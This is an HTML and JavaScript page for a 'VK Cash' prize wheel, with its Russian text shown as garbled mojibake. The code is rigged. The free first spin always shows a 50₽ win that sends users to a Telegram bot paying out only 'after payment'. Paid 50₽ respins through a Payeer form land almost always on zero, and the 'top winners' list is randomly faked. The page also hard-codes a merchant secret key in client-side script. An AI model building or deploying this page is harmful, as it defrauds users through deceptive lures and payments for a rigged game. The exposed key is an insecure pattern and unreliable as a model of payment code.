<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>VK Cash</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #111;
      color: #fff;
      text-align: center;
    }
    h1 {
      font-size: 36px;
      color: #337aff;
      margin-top: 30px;
    }
    #wheel-container {
      margin: 20px auto;
      width: 300px;
      height: 300px;
      position: relative;
    }
    #wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 10px solid #00aa40;
      background: conic-gradient(
        #e74c3c 0deg 72deg,
        #f1c40f 72deg 144deg,
        #2ecc71 144deg 216deg,
        #3498db 216deg 288deg,
        #7f8c8d 288deg 360deg
      );
      transition: transform 5s cubic-bezier(0.33, 1, 0.68, 1);
    }
    button {
      margin-top: 20px;
      font-size: 18px;
      padding: 12px 30px;
      background-color: #00aa40;
      border: none;
      color: white;
      border-radius: 8px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #666;
      cursor: not-allowed;
    }
    .result {
      font-size: 22px;
      margin-top: 20px;
    }
    .info-buttons {
      margin-top: 30px;
    }
    .info-buttons button {
      margin: 5px;
      padding: 10px 20px;
      background-color: #333;
      border: none;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    .top-winners {
      margin-top: 30px;
    }
    .top-winners ul {
      list-style: none;
      padding: 0;
      font-size: 18px;
    }
    #code {
      margin-top: 15px;
      font-weight: bold;
      color: #FFD700;
    }
    #modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    #modalContent {
      background: #222;
      padding: 30px;
      max-width: 90%;
      max-height: 80%;
      overflow-y: auto;
      border-radius: 10px;
      text-align: left;
      color: #fff;
    }
    #modalContent h2 {
      text-align: center;
      margin-top: 0;
    }
    #modalClose {
      margin-top: 20px;
      background-color: #FFD700;
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ VK Cash!</h1>

  <div id="wheel-container">
    <div id="wheel"></div>
  </div>

  <button id="spinBtn" onclick="spin()">–ö—Ä—É—Ç–∏—Ç—å –∫–æ–ª–µ—Å–æ</button>
  <button id="payBtn" onclick="payWithPayeer()" style="display:none;">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞ –∑–∞ 50‚ÇΩ</button>

  <div class="result" id="result"></div>
  <div id="code"></div>

  <div class="info-buttons">
    <button onclick="showModal('rules')">üìú –ü—Ä–∞–≤–∏–ª–∞ —É—á–∞—Å—Ç–∏—è</button>
    <button onclick="showModal('faq')">‚ùì FAQ</button>
    <button onclick="showModal('policy')">üìã –ü–æ–ª–∏—Ç–∏–∫–∞</button>
  </div>

  <div class="top-winners">
    <h2>üèÜ –¢–æ–ø –ø–æ–±–µ–¥–∏—Ç–µ–ª–µ–π</h2>
    <ul id="winners">
      <li>–î–∏–º–∞ ‚Äî 305‚ÇΩ</li>
      <li>–ñ–µ–Ω—è ‚Äî 55‚ÇΩ</li>
      <li>–°–∞—à–∞ ‚Äî 143‚ÇΩ</li>
      <li>–ê–ª–∏–Ω–∞ ‚Äî 439‚ÇΩ</li>
      <li>–õ–µ–Ω–∞ ‚Äî 62‚ÇΩ</li>
    </ul>
  </div>

  <div id="modal">
    <div id="modalContent">
      <h2 id="modalTitle"></h2>
      <div id="modalText"></div>
      <button id="modalClose" onclick="closeModal()">–ó–∞–∫—Ä—ã—Ç—å</button>
    </div>
  </div>

  <!-- Payeer Form -->
  <form id="payeerForm" method="post" action="https://payeer.com/merchant/" target="_blank" style="display:none;">
    <input type="hidden" name="m_shop" value="2210792738">
    <input type="hidden" name="m_orderid" id="m_orderid">
    <input type="hidden" name="m_amount" value="50.00">
    <input type="hidden" name="m_curr" value="RUB">
    <input type="hidden" name="m_desc" id="m_desc">
    <input type="hidden" name="m_sign" id="m_sign">
    <input type="submit" id="m_submit">
  </form>

  <script>
    let spinning = false;
    let firstSpin = true;
    let currentRotation = 0;
    const secretKey = "8KfFEx5giAxaIVYB";

    const wheel = document.getElementById("wheel");
    const resultEl = document.getElementById("result");
    const spinBtn = document.getElementById("spinBtn");
    const payBtn = document.getElementById("payBtn");
    const codeBlock = document.getElementById("code");

    const prizes = [50, 0, 0, 0, 0];

    function spin() {
      if (spinning) return;

      if (!firstSpin) {
        alert("–î–ª—è –Ω–æ–≤–æ–π –ø–æ–ø—ã—Ç–∫–∏ –Ω—É–∂–Ω–æ –æ–ø–ª–∞—Ç–∏—Ç—å 50‚ÇΩ.");
        return;
      }

      spinning = true;
      spinBtn.disabled = true;
      resultEl.innerHTML = "–ö—Ä—É—Ç–∏–º...";
      codeBlock.innerHTML = "";

      const prizeIndex = firstSpin ? 0 : Math.floor(Math.random() * prizes.length);
      const prize = prizes[prizeIndex];
      const angle = 360 * 5 + prizeIndex * 72 + 36;
      currentRotation += angle;

      wheel.style.transform = `rotate(${currentRotation}deg)`;

      setTimeout(() => {
        spinning = false;
        firstSpin = false;
        spinBtn.disabled = true;
        payBtn.style.display = "inline-block";

        if (prize === 0) {
          resultEl.innerHTML = "üò¢ –£–≤—ã, –Ω–∏—á–µ–≥–æ –Ω–µ –≤—ã–ø–∞–ª–æ. –ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞!";
        } else {
          resultEl.innerHTML = `üéâ –¢—ã –≤—ã–∏–≥—Ä–∞–ª ${prize}‚ÇΩ! –ó–∞–±–µ—Ä–∏ –≤—ã–∏–≥—Ä—ã—à —É <a href="https://t.me/ZaberiMANY_Bot" target="_blank">–±–æ—Ç–∞</a>`;
          const code = generateCode();
          codeBlock.innerText = `üé´ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: ${code}`;
        }
      }, 5000);
    }

    async function payWithPayeer() {
      const shop = "2210792738";
      const amount = "50.00";
      const currency = "RUB";
      const desc = btoa("VK Cash –ø–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞");
      const orderId = "VKCASH_" + Date.now();
      const data = `${shop}:${orderId}:${amount}:${currency}:${desc}:${secretKey}`;
      const sign = await sha256(data);

      document.getElementById("m_orderid").value = orderId;
      document.getElementById("m_desc").value = desc;
      document.getElementById("m_sign").value = sign.toUpperCase();
      document.getElementById("payeerForm").submit();
    }

    function sha256(str) {
      const buffer = new TextEncoder().encode(str);
      return crypto.subtle.digest("SHA-256", buffer).then(hash => {
        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
      });
    }

    function generateCode() {
      const timestamp = Date.now();
      const random = Math.random().toString(36).substring(2, 6).toUpperCase();
      return `CODE-50-${timestamp}-${random}`;
    }

    function showModal(type) {
      const titles = {
        rules: "üìú –ü—Ä–∞–≤–∏–ª–∞ —É—á–∞—Å—Ç–∏—è",
        faq: "‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã",
        policy: "üìã –ü–æ–ª–∏—Ç–∏–∫–∞"
      };
      const contents = {
        rules: "<ul><li>–ü–µ—Ä–≤–∞—è –ø—Ä–æ–∫—Ä—É—Ç–∫–∞ ‚Äî –±–µ—Å–ø–ª–∞—Ç–Ω–∞—è</li><li>–ü–æ–≤—Ç–æ—Ä–Ω–∞—è ‚Äî 50‚ÇΩ</li><li>–°—É–º–º—ã –≤—ã–∏–≥—Ä—ã—à–µ–π ‚Äî –æ—Ç 50‚ÇΩ –¥–æ 500‚ÇΩ</li></ul>",
        faq: "<ul><li>–ö–∞–∫ –∏–≥—Ä–∞—Ç—å? –ù–∞–∂–º–∏—Ç–µ '–ö—Ä—É—Ç–∏—Ç—å –∫–æ–ª–µ—Å–æ'</li><li>–ö–∞–∫ —Å–Ω–æ–≤–∞ —Å—ã–≥—Ä–∞—Ç—å? –ù–∞–∂–º–∏—Ç–µ '–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞'</li><li>–ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å –¥–µ–Ω—å–≥–∏? –ß–µ—Ä–µ–∑ Telegram-–±–æ—Ç–∞ –ø–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã</li></ul>",
        policy: "<ul><li>–†–∞–∑–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω—ã–π –ø—Ä–æ–µ–∫—Ç</li><li>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–ª—É—á–∞–π–Ω—ã</li><li>–í–æ–∑–≤—Ä–∞—Ç–∞ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–µ—Ç</li></ul>"
      };
      document.getElementById("modalTitle").innerText = titles[type];
      document.getElementById("modalText").innerHTML = contents[type];
      document.getElementById("modal").style.display = "flex";
    }

    function closeModal() {
      document.getElementById("modal").style.display = "none";
    }

    setInterval(() => {
      const names = ["–°–µ—Ä–≥–µ–π", "–ò—Ä–∏–Ω–∞", "–û–ª–µ–≥", "–ú–∞—Ä–∏—è", "–ú–∞–∫—Å–∏–º", "–¢–∞–Ω—è"];
      const list = document.getElementById("winners");
      list.innerHTML = "";
      for (let i = 0; i < 5; i++) {
        const name = names[Math.floor(Math.random() * names.length)];
        const amount = Math.floor(Math.random() * 450) + 50;
        list.innerHTML += `<li>${name} ‚Äî ${amount}‚ÇΩ</li>`;
      }
    }, 300000);
  </script>

</body>
</html>
